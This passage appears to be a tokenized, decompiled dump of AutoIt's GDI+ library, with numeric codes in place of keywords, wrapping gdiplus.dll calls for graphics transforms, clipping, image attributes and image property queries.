28$ARESULT=58($__G_HGDIPDLL,"int","GdipScaleWorldTransform","handle",$HGRAPHICS,"float",$FSCALEX,"float",$FSCALEY,"int",$IORDER)
4@ERROR534287(@ERROR,@EXTENDED,40)
4$ARESULT[0]534287(10,$ARESULT[0],40)
3439
33
32_GDIPLUS_GRAPHICSSETCLIPPATH($HGRAPHICS,$HPATH,$ICOMBINEMODE=0)
28$ARESULT=58($__G_HGDIPDLL,"int","GdipSetClipPath","handle",$HGRAPHICS,"handle",$HPATH,"int",$ICOMBINEMODE)
4@ERROR534287(@ERROR,@EXTENDED,40)
4$ARESULT[0]534287(10,$ARESULT[0],40)
3439
33
32_GDIPLUS_GRAPHICSSETCLIPRECT($HGRAPHICS,$NX,$NY,$NWIDTH,$NHEIGHT,$ICOMBINEMODE=0)
28$ARESULT=58($__G_HGDIPDLL,"int","GdipSetClipRect","handle",$HGRAPHICS,"float",$NX,"float",$NY,"float",$NWIDTH,"float",$NHEIGHT,"int",$ICOMBINEMODE)
4@ERROR534287(@ERROR,@EXTENDED,40)
4$ARESULT[0]534287(10,$ARESULT[0],40)
3439
33
32_GDIPLUS_GRAPHICSSETCLIPREGION($HGRAPHICS,$HREGION,$ICOMBINEMODE=0)
28$ARESULT=58($__G_HGDIPDLL,"int","GdipSetClipRegion","handle",$HGRAPHICS,"handle",$HREGION,"int",$ICOMBINEMODE)
4@ERROR534287(@ERROR,@EXTENDED,40)
4$ARESULT[0]534287(10,$ARESULT[0],40)
3439
33
32_GDIPLUS_GRAPHICSSETCOMPOSITINGMODE($HGRAPHICS,$ICOMPOSITIONMODE)
28$ARESULT=58($__G_HGDIPDLL,"int","GdipSetCompositingMode","handle",$HGRAPHICS,"int",$ICOMPOSITIONMODE)
4@ERROR534287(@ERROR,@EXTENDED,40)
4$ARESULT[0]534287(10,$ARESULT[0],40)
3439
33
32_GDIPLUS_GRAPHICSSETCOMPOSITINGQUALITY($HGRAPHICS,$ICOMPOSITIONQUALITY)
28$ARESULT=58($__G_HGDIPDLL,"int","GdipSetCompositingQuality","handle",$HGRAPHICS,"int",$ICOMPOSITIONQUALITY)
4@ERROR534287(@ERROR,@EXTENDED,40)
4$ARESULT[0]534287(10,$ARESULT[0],40)
3439
33
32_GDIPLUS_GRAPHICSSETINTERPOLATIONMODE($HGRAPHICS,$IINTERPOLATIONMODE)
28$ARESULT=58($__G_HGDIPDLL,"int","GdipSetInterpolationMode","handle",$HGRAPHICS,"int",$IINTERPOLATIONMODE)
4@ERROR534287(@ERROR,@EXTENDED,40)
4$ARESULT[0]534287(10,$ARESULT[0],40)
3439
33
32_GDIPLUS_GRAPHICSSETPIXELOFFSETMODE($HGRAPHICS,$IPIXELOFFSETMODE)
28$ARESULT=58($__G_HGDIPDLL,"int","GdipSetPixelOffsetMode","handle",$HGRAPHICS,"int",$IPIXELOFFSETMODE)
4@ERROR534287(@ERROR,@EXTENDED,40)
4$ARESULT[0]534287(10,$ARESULT[0],40)
3439
33
32_GDIPLUS_GRAPHICSSETSMOOTHINGMODE($HGRAPHICS,$ISMOOTH)
4$ISMOOTH<$GDIP_SMOOTHINGMODE_DEFAULT2$ISMOOTH>$GDIP_SMOOTHINGMODE_ANTIALIAS8X85$ISMOOTH=$GDIP_SMOOTHINGMODE_DEFAULT
28$ARESULT=58($__G_HGDIPDLL,"int","GdipSetSmoothingMode","handle",$HGRAPHICS,"int",$ISMOOTH)
4@ERROR534287(@ERROR,@EXTENDED,40)
4$ARESULT[0]534287(10,$ARESULT[0],40)
3439
33
32_GDIPLUS_GRAPHICSSETTEXTRENDERINGHINT($HGRAPHICS,$ITEXTRENDERINGHINT)
28$ARESULT=58($__G_HGDIPDLL,"int","GdipSetTextRenderingHint","handle",$HGRAPHICS,"int",$ITEXTRENDERINGHINT)
4@ERROR534287(@ERROR,@EXTENDED,40)
4$ARESULT[0]534287(10,$ARESULT[0],40)
3439
33
32_GDIPLUS_GRAPHICSSETTRANSFORM($HGRAPHICS,$HMATRIX)
28$ARESULT=58($__G_HGDIPDLL,"int","GdipSetWorldTransform","handle",$HGRAPHICS,"handle",$HMATRIX)
4@ERROR534287(@ERROR,@EXTENDED,40)
4$ARESULT[0]534287(10,$ARESULT[0],40)
3439
33
32_GDIPLUS_GRAPHICSTRANSFORMPOINTS($HGRAPHICS,36$APOINTS,$ICOORDSPACETO=0,$ICOORDSPACEFROM=1)
28$ICOUNT=$APOINTS[0][0]
28$TPOINTS=65("float["&$ICOUNT*2&"]")
13$II=115$ICOUNT
69($TPOINTS,1,$APOINTS[$II][0],($II-1)*2+1)
69($TPOINTS,1,$APOINTS[$II][1],($II-1)*2+2)
14
28$ARESULT=58($__G_HGDIPDLL,"int","GdipTransformPoints","handle",$HGRAPHICS,"int",$ICOORDSPACETO,"int",$ICOORDSPACEFROM,"struct*",$TPOINTS,"int",$ICOUNT)
4@ERROR534287(@ERROR,@EXTENDED,40)
4$ARESULT[0]534287(10,$ARESULT[0],40)
13$II=115$ICOUNT
$APOINTS[$II][0]=66($TPOINTS,1,($II-1)*2+1)
$APOINTS[$II][1]=66($TPOINTS,1,($II-1)*2+2)
14
3439
33
32_GDIPLUS_GRAPHICSTRANSLATETRANSFORM($HGRAPHICS,$NDX,$NDY,$IORDER=0)
28$ARESULT=58($__G_HGDIPDLL,"int","GdipTranslateWorldTransform","handle",$HGRAPHICS,"float",$NDX,"float",$NDY,"int",$IORDER)
4@ERROR534287(@ERROR,@EXTENDED,40)
4$ARESULT[0]534287(10,$ARESULT[0],40)
3439
33
32_GDIPLUS_HATCHBRUSHCREATE($IHATCHSTYLE=0,$IARGBFOREGROUND=-1,$IARGBBACKGROUND=-1)
28$ARESULT=58($__G_HGDIPDLL,"int","GdipCreateHatchBrush","int",$IHATCHSTYLE,"uint",$IARGBFOREGROUND,"uint",$IARGBBACKGROUND,"handle*",0)
4@ERROR534287(@ERROR,@EXTENDED,0)
4$ARESULT[0]534287(10,$ARESULT[0],0)
34$ARESULT[4]
33
32_GDIPLUS_HICONCREATEFROMBITMAP($HBITMAP)
28$ARESULT=58($__G_HGDIPDLL,"int","GdipCreateHICONFromBitmap","handle",$HBITMAP,"handle*",0)
4@ERROR534287(@ERROR,@EXTENDED,0)
4$ARESULT[0]534287(10,$ARESULT[0],0)
34$ARESULT[2]
33
32_GDIPLUS_IMAGEATTRIBUTESCREATE()
28$ARESULT=58($__G_HGDIPDLL,"int","GdipCreateImageAttributes","handle*",0)
4@ERROR534287(@ERROR,@EXTENDED,0)
4$ARESULT[0]534287(10,$ARESULT[0],0)
34$ARESULT[1]
33
32_GDIPLUS_IMAGEATTRIBUTESDISPOSE($HIMAGEATTRIBUTES)
28$ARESULT=58($__G_HGDIPDLL,"int","GdipDisposeImageAttributes","handle",$HIMAGEATTRIBUTES)
4@ERROR534287(@ERROR,@EXTENDED,40)
4$ARESULT[0]534287(10,$ARESULT[0],40)
3439
33
32_GDIPLUS_IMAGEATTRIBUTESSETCOLORKEYS($HIMAGEATTRIBUTES,$ICOLORADJUSTTYPE=0,$BENABLE=40,$IARGBLOW=0,$IARGBHIGH=0)
28$ARESULT=58($__G_HGDIPDLL,"int","GdipSetImageAttributesColorKeys","handle",$HIMAGEATTRIBUTES,"int",$ICOLORADJUSTTYPE,"int",$BENABLE,"uint",$IARGBLOW,"uint",$IARGBHIGH)
4@ERROR534287(@ERROR,@EXTENDED,40)
4$ARESULT[0]534287(10,$ARESULT[0],40)
3439
33
32_GDIPLUS_IMAGEATTRIBUTESSETCOLORMATRIX($HIMAGEATTRIBUTES,$ICOLORADJUSTTYPE=0,$BENABLE=40,$TCLRMATRIX=0,$TGRAYMATRIX=0,$ICOLORMATRIXFLAGS=0)
28$ARESULT=58($__G_HGDIPDLL,"int","GdipSetImageAttributesColorMatrix","handle",$HIMAGEATTRIBUTES,"int",$ICOLORADJUSTTYPE,"int",$BENABLE,"struct*",$TCLRMATRIX,"struct*",$TGRAYMATRIX,"int",$ICOLORMATRIXFLAGS)
4@ERROR534287(@ERROR,@EXTENDED,40)
4$ARESULT[0]534287(10,$ARESULT[0],40)
3439
33
32_GDIPLUS_IMAGEATTRIBUTESSETREMAPTABLE($HIMAGEATTRIBUTES,$ACOLORMAP=0,$ICOLORADJUSTTYPE=0,$BENABLE=39)
28$ARESULT
4219($ACOLORMAP)5
28$ICOUNT=$ACOLORMAP[0][0]
28$TCOLORMAP=65("uint["&$ICOUNT*2&"]")
13$I=115$ICOUNT
69($TCOLORMAP,1,$ACOLORMAP[$I][0],($I-1)*2+1)
69($TCOLORMAP,1,$ACOLORMAP[$I][1],($I-1)*2+2)
14
$ARESULT=58($__G_HGDIPDLL,"int","GdipSetImageAttributesRemapTable","handle",$HIMAGEATTRIBUTES,"int",$ICOLORADJUSTTYPE,"int",$BENABLE,"int",$ICOUNT,"struct*",$TCOLORMAP)
6
$ARESULT=58($__G_HGDIPDLL,"int","GdipSetImageAttributesRemapTable","handle",$HIMAGEATTRIBUTES,"int",$ICOLORADJUSTTYPE,"int",$BENABLE,"int",0,"struct*",0)
8
4@ERROR534287(@ERROR,@EXTENDED,40)
4$ARESULT[0]534287(10,$ARESULT[0],40)
3439
33
32_GDIPLUS_IMAGEATTRIBUTESSETTHRESHOLD($HIMAGEATTRIBUTES,$FTHRESHOLD,$ICOLORADJUSTTYPE=$GDIP_COLORADJUSTTYPE_DEFAULT,$BENABLE=39)
28$ARESULT=58($__G_HGDIPDLL,"int","GdipSetImageAttributesThreshold","handle",$HIMAGEATTRIBUTES,"int",$ICOLORADJUSTTYPE,"bool",$BENABLE,"float",$FTHRESHOLD)
4@ERROR534287(@ERROR,@EXTENDED,40)
4$ARESULT[0]534287(10,$ARESULT[0],40)
3439
33
32_GDIPLUS_IMAGECLONE($HIMAGE)
28$ARESULT=58($__G_HGDIPDLL,"int","GdipCloneImage","handle",$HIMAGE,"handle*",0)
4@ERROR534287(@ERROR,@EXTENDED,0)
4$ARESULT[0]534287(10,$ARESULT[0],0)
34$ARESULT[2]
33
32_GDIPLUS_IMAGEDISPOSE($HIMAGE)
28$ARESULT=58($__G_HGDIPDLL,"int","GdipDisposeImage","handle",$HIMAGE)
4@ERROR534287(@ERROR,@EXTENDED,40)
4$ARESULT[0]534287(10,$ARESULT[0],40)
3439
33
32_GDIPLUS_IMAGEGETDIMENSION($HIMAGE)
28$ARESULT=58($__G_HGDIPDLL,"int","GdipGetImageDimension","handle",$HIMAGE,"float*",0,"float*",0)
4@ERROR534287(@ERROR,@EXTENDED,0)
4$ARESULT[0]534287(10,$ARESULT[0],0)
28$AIMGDIM[2]=[$ARESULT[2],$ARESULT[3]]
34$AIMGDIM
33
32_GDIPLUS_IMAGEGETFLAGS($HIMAGE)
28$AFLAG[2]=[0,""]
4($HIMAGE=-1)2(3$HIMAGE)534287(11,0,$AFLAG)
28$AIMAGEFLAGS[13][2]=[["Pixel data Cacheable",$GDIP_IMAGEFLAGS_CACHING],["Pixel data read-only",$GDIP_IMAGEFLAGS_READONLY],["Pixel size in image",$GDIP_IMAGEFLAGS_HASREALPIXELSIZE],["DPI info in image",$GDIP_IMAGEFLAGS_HASREALDPI],["YCCK color space",$GDIP_IMAGEFLAGS_COLORSPACE_YCCK],["YCBCR color space",$GDIP_IMAGEFLAGS_COLORSPACE_YCBCR],["Grayscale image",$GDIP_IMAGEFLAGS_COLORSPACE_GRAY],["CMYK color space",$GDIP_IMAGEFLAGS_COLORSPACE_CMYK],["RGB color space",$GDIP_IMAGEFLAGS_COLORSPACE_RGB],["Partially scalable",$GDIP_IMAGEFLAGS_PARTIALLYSCALABLE],["Alpha values other than 0 (transparent) and 255 (opaque)",$GDIP_IMAGEFLAGS_HASTRANSLUCENT],["Alpha values",$GDIP_IMAGEFLAGS_HASALPHA],["Scalable",$GDIP_IMAGEFLAGS_SCALABLE]]
28$ARESULT=58($__G_HGDIPDLL,"int","GdipGetImageFlags","handle",$HIMAGE,"long*",0)
4@ERROR534287(@ERROR,@EXTENDED,$AFLAG)
4$ARESULT[0]534287(10,$ARESULT[0],$AFLAG)
4$ARESULT[2]=$GDIP_IMAGEFLAGS_NONE5
$AFLAG[1]="No pixel data"
34287(12,$ARESULT[2],$AFLAG)
8
$AFLAG[0]=$ARESULT[2]
13$I=01512
417($ARESULT[2],$AIMAGEFLAGS[$I][1])=$AIMAGEFLAGS[$I][1]5
4323($AFLAG[1])5$AFLAG[1]&="|"
$ARESULT[2]-=$AIMAGEFLAGS[$I][1]
$AFLAG[1]&=$AIMAGEFLAGS[$I][0]
8
14
34$AFLAG
33
32_GDIPLUS_IMAGEGETFRAMECOUNT($HIMAGE,$SDIMENSIONID)
28$TGUID=_WINAPI_GUIDFROMSTRING($SDIMENSIONID)
28$ARESULT=58($__G_HGDIPDLL,"int","GdipImageGetFrameCount","handle",$HIMAGE,"struct*",$TGUID,"uint*",0)
4@ERROR534287(@ERROR,@EXTENDED,-1)
4$ARESULT[0]534287(10,$ARESULT[0],-1)
34$ARESULT[3]
33
32_GDIPLUS_IMAGEGETGRAPHICSCONTEXT($HIMAGE)
28$ARESULT=58($__G_HGDIPDLL,"int","GdipGetImageGraphicsContext","handle",$HIMAGE,"handle*",0)
4@ERROR534287(@ERROR,@EXTENDED,0)
4$ARESULT[0]534287(10,$ARESULT[0],0)
34$ARESULT[2]
33
32_GDIPLUS_IMAGEGETHEIGHT($HIMAGE)
28$ARESULT=58($__G_HGDIPDLL,"int","GdipGetImageHeight","handle",$HIMAGE,"uint*",0)
4@ERROR534287(@ERROR,@EXTENDED,-1)
4$ARESULT[0]534287(10,$ARESULT[0],-1)
34$ARESULT[2]
33
32_GDIPLUS_IMAGEGETHORIZONTALRESOLUTION($HIMAGE)
4($HIMAGE=-1)2(3$HIMAGE)534287(11,0,0)
28$ARESULT=58($__G_HGDIPDLL,"int","GdipGetImageHorizontalResolution","handle",$HIMAGE,"float*",0)
4@ERROR534287(@ERROR,@EXTENDED,0)
4$ARESULT[0]534287(10,$ARESULT[0],0)
34280($ARESULT[2])
33
32_GDIPLUS_IMAGEGETPIXELFORMAT($HIMAGE)
28$AFORMAT[2]=[0,""]
4($HIMAGE=-1)2(3$HIMAGE)534287(11,0,$AFORMAT)
28$APIXELFORMAT[14][2]=[["1 Bpp Indexed",$GDIP_PXF01INDEXED],["4 Bpp Indexed",$GDIP_PXF04INDEXED],["8 Bpp Indexed",$GDIP_PXF08INDEXED],["16 Bpp Grayscale",$GDIP_PXF16GRAYSCALE],["16 Bpp RGB 555",$GDIP_PXF16RGB555],["16 Bpp RGB 565",$GDIP_PXF16RGB565],["16 Bpp ARGB 1555",$GDIP_PXF16ARGB1555],["24 Bpp RGB",$GDIP_PXF24RGB],["32 Bpp RGB",$GDIP_PXF32RGB],["32 Bpp ARGB",$GDIP_PXF32ARGB],["32 Bpp PARGB",$GDIP_PXF32PARGB],["48 Bpp RGB",$GDIP_PXF48RGB],["64 Bpp ARGB",$GDIP_PXF64ARGB],["64 Bpp PARGB",$GDIP_PXF64PARGB]]
28$ARESULT=58($__G_HGDIPDLL,"int","GdipGetImagePixelFormat","handle",$HIMAGE,"int*",0)
4@ERROR534287(@ERROR,@EXTENDED,$AFORMAT)
4$ARESULT[0]534287(10,$ARESULT[0],$AFORMAT)
13$I=01513
4$APIXELFORMAT[$I][1]=$ARESULT[2]5
$AFORMAT[0]=$APIXELFORMAT[$I][1]
$AFORMAT[1]=$APIXELFORMAT[$I][0]
34$AFORMAT
8
14
34287(12,0,$AFORMAT)
33
32__GDIPLUS_IMAGEGETPROPERTYCOUNT($HIMAGE)
28$ARESULT=58($__G_HGDIPDLL,"int","GdipGetPropertyCount","handle",$HIMAGE,"uint*",0)
4@ERROR534287(@ERROR,@EXTENDED,-1)
4$ARESULT[0]534287(10,$ARESULT[0],-1)
34$ARESULT[2]
33
32_GDIPLUS_IMAGEGETPROPERTYIDLIST($HIMAGE)
28$ICOUNT=__GDIPLUS_IMAGEGETPROPERTYCOUNT($HIMAGE)
4@ERROR534287(@ERROR,@EXTENDED,40)
28$TPROPERTIES=65("uint["&$ICOUNT&"]")
28$ARESULT=58($__G_HGDIPDLL,"int","GdipGetPropertyIdList","handle",$HIMAGE,"int",$ICOUNT,"struct*",$TPROPERTIES)
4@ERROR534287(@ERROR,@EXTENDED,40)
4$ARESULT[0]534287(10,$ARESULT[0],40)
28$SPROPERTYTAGINFO="0x0000=GpsVer;0x0001=GpsLatitudeRef;0x0002=GpsLatitude;0x0003=GpsLongitudeRef;0x0004=GpsLongitude;0x0005=GpsAltitudeRef;0x0006=GpsAltitude;0x0007=GpsGpsTime;0x0008=GpsGpsSatellites;0x0009=GpsGpsStatus;0x000A=GpsGpsMeasureMode;0x000B=GpsGpsDop;0x000C=GpsSpeedRef;0x000D=GpsSpeed;0x000E=GpsTrackRef;0x000F=GpsTrack;0x0010=GpsImgDirRef;0x0011=GpsImgDir;0x0012=GpsMapDatum;0x0013=GpsDestLatRef;0x0014=GpsDestLat;0x0015=GpsDestLongRef;0x0016=GpsDestLong;0x0017=GpsDestBearRef;0x0018=GpsDestBear;0x0019=GpsDestDistRef;0x001A=GpsDestDist;0x00FE=NewSubfileType;0x00FF=SubfileType;0x0100=ImageWidth;0x0101=ImageHeight;0x0102=BitsPerSample;0x0103=Compression;0x0106=PhotometricInterp;0x0107=ThreshHolding;0x0108=CellWidth;0x0109=CellHeight;0x010A=FillOrder;0x010D=DocumentName;0x010E=ImageDescription;0x010F=EquipMake;0x0110=EquipModel;0x0111=StripOffsets;0x0112=Orientation;0x0115=SamplesPerPixel;0x0116=RowsPerStrip;0x0117=StripBytesCount;0x0118=MinSampleValue;0x0119=MaxSampleValue;0x011A=XResolution;0x011B=YResolution;0x011C=PlanarConfig;0x011D=PageName;0x011E=XPosition;0x011F=YPosition;0x0120=FreeOffset;0x0121=FreeByteCounts;0x0122=GrayResponseUnit;0x0123=GrayResponseCurve;0x0124=T4Option;0x0125=T6Option;0x0128=ResolutionUnit;0x0129=PageNumber;0x012D=TransferFunction;0x0131=SoftwareUsed;0x0132=DateTime;0x013B=Artist;0x013C=HostComputer;0x013D=Predictor;0x013E=WhitePoint;0x013F=PrimaryChromaticities;0x0140=ColorMap;0x0141=HalftoneHints;0x0142=TileWidth;0x0143=TileLength;0x0144=TileOffset;0x0145=TileByteCounts;0x014C=InkSet;0x014D=InkNames;0x014E=NumberOfInks;0x0150=DotRange;0x0151=TargetPrinter;0x0152=ExtraSamples;0x0153=SampleFormat;0x0154=SMinSampleValue;0x0155=SMaxSampleValue;0x0156=TransferRange;0x0200=JPEGProc;0x0201=JPEGInterFormat;0x0202=JPEGInterLength;0x0203=JPEGRestartInterval;0x0205=JPEGLosslessPredictors;0x0206=JPEGPointTransforms;0x0207=JPEGQTables;0x0208=JPEGDCTables;0x0209=JPEGACTables;0x0211=YCbCrCoefficients;0x0212=YCbCrSubsampling;0x0213=YCbCrPositioning;0x0214=REFBlac"
$SPROPERTYTAGINFO&="kWhite;0x0301=Gamma;0x0302=ICCProfileDescriptor;0x0303=SRGBRenderingIntent;0x0320=ImageTitle;0x5001=ResolutionXUnit;0x5002=ResolutionYUnit;0x5003=ResolutionXLengthUnit;0x5004=ResolutionYLengthUnit;0x5005=PrintFlags;0x5006=PrintFlagsVersion;0x5007=PrintFlagsCrop;0x5008=PrintFlagsBleedWidth;0x5009=PrintFlagsBleedWidthScale;0x500A=HalftoneLPI;0x500B=HalftoneLPIUnit;0x500C=HalftoneDegree;0x500D=HalftoneShape;0x500E=HalftoneMisc;0x500F=HalftoneScreen;0x5010=JPEGQuality;0x5011=GridSize;0x5012=ThumbnailFormat;0x5013=ThumbnailWidth;0x5014=ThumbnailHeight;0x5015=ThumbnailColorDepth;0x5016=ThumbnailPlanes;0x5017=ThumbnailRawBytes;0x5018=ThumbnailSize;0x5019=ThumbnailCompressedSize;0x501A=ColorTransferFunction;0x501B=ThumbnailData;0x5020=ThumbnailImageWidth;0x5021=ThumbnailImageHeight;0x5022=ThumbnailBitsPerSample;0x5023=ThumbnailCompression;0x5024=ThumbnailPhotometricInterp;0x5025=ThumbnailImageDescription;0x5026=ThumbnailEquipMake;0x5027=ThumbnailEquipModel;0x5028=ThumbnailStripOffsets;0x5029=ThumbnailOrientation;0x502A=ThumbnailSamplesPerPixel;0x502B=ThumbnailRowsPerStrip;0x502C=ThumbnailStripBytesCount;0x502D=ThumbnailResolutionX;0x502E=ThumbnailResolutionY;0x502F=ThumbnailPlanarConfig;0x5030=ThumbnailResolutionUnit;0x5031=ThumbnailTransferFunction;0x5032=ThumbnailSoftwareUsed;0x5033=ThumbnailDateTime;0x5034=ThumbnailArtist;0x5035=ThumbnailWhitePoint;0x5036=ThumbnailPrimaryChromaticities;0x5037=ThumbnailYCbCrCoefficients;0x5038=ThumbnailYCbCrSubsampling;0x5039=ThumbnailYCbCrPositioning;0x503A=ThumbnailRefBlackWhite;0x503B=ThumbnailCopyRight;0x5090=LuminanceTable;0x5091=ChrominanceTable;0x5100=FrameDelay;0x5101=LoopCount;0x5102=GlobalPalette;0x5103=IndexBackground;0x5104=IndexTransparent;0x5110=PixelUnit;0x5111=PixelPerUnitX;0x5112=PixelPerUnitY;0x5113=PaletteHistogram;0x8298=Copyright;0x829A=ExifExposureTime;0x829D=ExifFNumber;0x8769=ExifIFD;0x8773=ICCProfile;0x8822=ExifExposureProg;0x8824=ExifSpectralSense;0x8825=GpsIFD;0x8827=ExifISOSpeed;0x8828=ExifOECF;0x9000=ExifVer;0"
$SPROPERTYTAGINFO&="x9003=ExifDTOrig;0x9004=ExifDTDigitized;0x9101=ExifCompConfig;0x9102=ExifCompBPP;0x9201=ExifShutterSpeed;0x9202=ExifAperture;0x9203=ExifBrightness;0x9204=ExifExposureBias;0x9205=ExifMaxAperture;0x9206=ExifSubjectDist;0x9207=ExifMeteringMode;0x9208=ExifLightSource;0x9209=ExifFlash;0x920A=ExifFocalLength;0x927C=ExifMakerNote;0x9286=ExifUserComment;0x9290=ExifDTSubsec;0x9291=ExifDTOrigSS;0x9292=ExifDTDigSS;0xA000=ExifFPXVer;0xA001=ExifColorSpace;0xA002=ExifPixXDim;0xA003=ExifPixYDim;0xA004=ExifRelatedWav;0xA005=ExifInterop;0xA20B=ExifFlashEnergy;0xA20C=ExifSpatialFR;0xA20E=ExifFocalXRes;0xA20F=ExifFocalYRes;0xA210=ExifFocalResUnit;0xA214=ExifSubjectLoc;0xA215=ExifExposureIndex;0xA217=ExifSensingMethod;0xA300=ExifFileSource;0xA301=ExifSceneType;0xA302=ExifCfaPattern"
28$APROPERTIES[$ICOUNT+1][2]=[[$ICOUNT]]
28$AREGEXP
13$I=115$ICOUNT
$APROPERTIES[$I][0]=66($TPROPERTIES,1,$I)
$AREGEXP=326($SPROPERTYTAGINFO,"(?i)"&199(66($TPROPERTIES,1,$I),4)&"=(\w+)",3)
23219($AREGEXP)
2139
$APROPERTIES[$I][1]=$AREGEXP[0]
216
$APROPERTIES[$I][1]="PropertyTagUnKnown"
24
14
34$APROPERTIES
33
32__GDIPLUS_IMAGEGETPROPERTYITEMSIZE($HIMAGE,$IPROPID)
28$ARESULT=58($__G_HGDIPDLL,"int","GdipGetPropertyItemSize","handle",$HIMAGE,"uint",$IPROPID,"uint*",0)
4@ERROR534287(@ERROR,@EXTENDED,-1)
4$ARESULT[0]534287(10,$ARESULT[0],-1)
34$ARESULT[3]
33
32_GDIPLUS_IMAGEGETPROPERTYITEM($HIMAGE,$IPROPID)
28$ISIZE=__GDIPLUS_IMAGEGETPROPERTYITEMSIZE($HIMAGE,$IPROPID)
4@ERROR534287(@ERROR,@EXTENDED,40)
28$TBUFFER=65("byte["&$ISIZE&"];")
28$PBUFFER=67($TBUFFER)
28$ARESULT=58($__G_HGDIPDLL,"int","GdipGetPropertyItem","handle",$HIMAGE,"uint",$IPROPID,"uint",$ISIZE,"struct*",$TBUFFER)
4@ERROR534287(@ERROR,@EXTENDED,-1)
4$ARESULT[0]534287(10,$ARESULT[0],40)
28$TPROPERTYITEM=65("int id; int length; short type; ptr value;",$PBUFFER)
28$IBYTES=66($TPROPERTYITEM,"length")
28$PVALUE=66($TPROPERTYITEM,"value")
28$TVALUES,$IVALUES
2366($TPROPERTYITEM,"type")
212
$IVALUES=1
$TVALUES=65("char["&$IBYTES&"];",$PVALUE)
213
$IVALUES=217($IBYTES/2)
$TVALUES=65("ushort["&$IVALUES&"];",$PVALUE)
214,5
$IVALUES=217($IBYTES/4)
$TVALUES=65("uint["&$IVALUES&"];",$PVALUE)
219,10
$IVALUES=217($IBYTES/4)
$TVALUES=65("int["&$IVALUES&"];",$PVALUE)
216
$IVALUES=1
$TVALUES=65("byte["&$IBYTES&"];",$PVALUE)
24
28$AVALUES[$IVALUES+1]=[$IVALUES]
2366($TPROPERTYITEM,"type")
215,10
$IVALUES=217($IVALUES/2)
27$AVALUES[$IVALUES+1]
$AVALUES[0]=$IVALUES
13$J=115$IVALUES
$AVALUES[$J]=66($TVALUES,1,($J-1)*2+1)/66($TVALUES,1,($J-1)*2+2)
14
213,4,9
13$J=115$IVALUES
$AVALUES[$J]=66($TVALUES,1,$J)
14
216
$AVALUES[1]=66($TVALUES,1)
24
34$AVALUES
33
32_GDIPLUS_IMAGEGETRAWFORMAT($HIMAGE)
28$AGUID[2]
4($HIMAGE=-1)2(3$HIMAGE)534287(11,0,$AGUID)
28$AIMAGETYPE[11][2]=[["UNDEFINED",$GDIP_IMAGEFORMAT_UNDEFINED],["MEMORYBMP",$GDIP_IMAGEFORMAT_MEMORYBMP],["BMP",$GDIP_IMAGEFORMAT_BMP],["EMF",$GDIP_IMAGEFORMAT_EMF],["WMF",$GDIP_IMAGEFORMAT_WMF],["JPEG",$GDIP_IMAGEFORMAT_JPEG],["PNG",$GDIP_IMAGEFORMAT_PNG],["GIF",$GDIP_IMAGEFORMAT_GIF],["TIFF",$GDIP_IMAGEFORMAT_TIFF],["EXIF",$GDIP_IMAGEFORMAT_EXIF],["ICON",$GDIP_IMAGEFORMAT_ICON]]
28$TSTRUCT=65("byte[16]")
28$ARESULT1=58($__G_HGDIPDLL,"int","GdipGetImageRawFormat","handle",$HIMAGE,"struct*",$TSTRUCT)
4@ERROR534287(@ERROR,@EXTENDED,$AGUID)
4$ARESULT1[0]534287(10,$ARESULT1[0],$AGUID)
28$SRESULT2=_WINAPI_STRINGFROMGUID($ARESULT1[2])
4@ERROR534287(@ERROR+20,@EXTENDED,$AGUID)
4$SRESULT2=""534287(12,0,$AGUID)
13$I=01510
4$AIMAGETYPE[$I][1]==$SRESULT25
$AGUID[0]=$AIMAGETYPE[$I][1]
$AGUID[1]=$AIMAGETYPE[$I][0]
34$AGUID
8
14
34287(13,0,$AGUID)
33
32_GDIPLUS_IMAGEGETTHUMBNAIL($HIMAGE,$IWIDTH=0,$IHEIGHT=0,$BKEEPRATIO=39,$HCALLBACK=42,$HCALLBACKDATA=42)
4$BKEEPRATIO5
28$AIMGDIM=_GDIPLUS_IMAGEGETDIMENSION($HIMAGE)
4@ERROR534287(@ERROR+20,@EXTENDED,40)
28$F
4$IWIDTH<12$IHEIGHT<15
$IWIDTH=0
$IHEIGHT=0
6
4($AIMGDIM[0]/$AIMGDIM[1])>15
$F=$AIMGDIM[0]/$IWIDTH
6
$F=$AIMGDIM[1]/$IHEIGHT
8
$IWIDTH=217($AIMGDIM[0]/$F)
$IHEIGHT=217($AIMGDIM[1]/$F)
8
8
28$ARESULT=58($__G_HGDIPDLL,"int","GdipGetImageThumbnail","handle",$HIMAGE,"uint",$IWIDTH,"uint",$IHEIGHT,"ptr*",0,"ptr",$HCALLBACK,"ptr",$HCALLBACKDATA)
4@ERROR534287(@ERROR,@EXTENDED,40)
4$ARESULT[0]534287(10,$ARESULT[0],40)
34$ARESULT[4]
33
32_GDIPLUS_IMAGEGETTYPE($HIMAGE)
4($HIMAGE=-1)2(3$HIMAGE)534287(11,0,-1)
28$ARESULT=58($__G_HGDIPDLL,"int","GdipGetImageType","handle",$HIMAGE,"int*",0)
4@ERROR534287(@ERROR,@EXTENDED,-1)
4$ARESULT[0]534287(10,$ARESULT[0],-1)
34$ARESULT[2]
33
32_GDIPLUS_IMAGEGETVERTICALRESOLUTION($HIMAGE)
4($HIMAGE=-1)2(3$HIMAGE)534287(11,0,0)
28$ARESULT=58($__G_HGDIPDLL,"int","GdipGetImageVerticalResolution","handle",$HIMAGE,"float*",0)
4@ERROR534287(@ERROR,@EXTENDED,0)
4$ARESULT[0]534287(10,$ARESULT[0],0)
34280($ARESULT[2])
33
32_GDIPLUS_IMAGEGETWIDTH($HIMAGE)
28$ARESULT=58($__G_HGDIPDLL,"int","GdipGetImageWidth","handle",$HIMAGE,"uint*",-1)
4@ERROR534287(@ERROR,@EXTENDED,-1)
4$ARESULT[0]534287(10,$ARESULT[0],-1)
34$ARESULT[2]
33
32_GDIPLUS_IMAGELOADFROMFILE($SFILENAME)
28$ARESULT=58($__G_HGDIPDLL,"int","GdipLoadImageFromFile","wstr",$SFILENAME,"handle*",0)
4@ERROR534287(@ERROR,@EXTENDED,0)
4$ARESULT[0]534287(10,$ARESULT[0],0)
34$ARESULT[2]
33
32_GDIPLUS_IMAGELOADFROMSTREAM($PSTREAM)
28$ARESULT=58($__G_HGDIPDLL,"int","GdipLoadImageFromStream","ptr",$PSTREAM,"handle*",0)
4@ERROR534287(@ERROR,@EXTENDED,0)
4$ARESULT[0]534287(10,$ARESULT[0],0)
34$ARESULT[2]
33
32_GDIPLUS_IMAGEROTATEFLIP($HIMAGE,$IROTATEFLIPTYPE)
28$ARESULT=58($__G_HGDIPDLL,"int","GdipImageRotateFlip","handle",$HIMAGE,"int",$IROTATEFLIPTYPE)
4@ERROR534287(@ERROR,@EXTENDED,40)
